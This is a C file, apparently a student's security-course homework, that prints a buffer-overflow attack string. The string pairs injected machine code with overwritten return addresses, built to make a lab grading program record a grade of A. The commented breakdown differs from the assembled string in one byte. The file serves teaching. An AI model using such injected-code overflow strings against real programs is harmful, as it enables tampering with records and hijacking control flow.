// Jennifer Long
// rz5sc
// CS 4630 HW 7
// attack-gradeA.c

#include <stdio.h>
#include <string.h>

// attackString is comprised of the following, in order:
// char name[] = "Jennifer Long\x00";
// char filler[] = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
// char makeGradeA[] = "\xc6\x05\x2c\xa0\x04\x08\x41\x68\xb9\x85\x04\x08\xc3";
// char savedParams[] = "\x28\xde\xff\xff\xd0\xdd\xff\xff\x80\xa0\x04\x08";
char attackString[] = "Jennifer Long\x00XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\xc6\x05\x2c\xa0\x04\x08\x41\x68\xb9\x85\x04\x08\xc3\x28\xde\xff\xff\xfb\xdd\xff\xff\x80\xa0\x04\x08";

int main() {
 int i;
 char *p = attackString;
 for (i = 0; i < sizeof(attackString); i++) {
   putchar(*p);
   p++;
 }
 return 1;
}
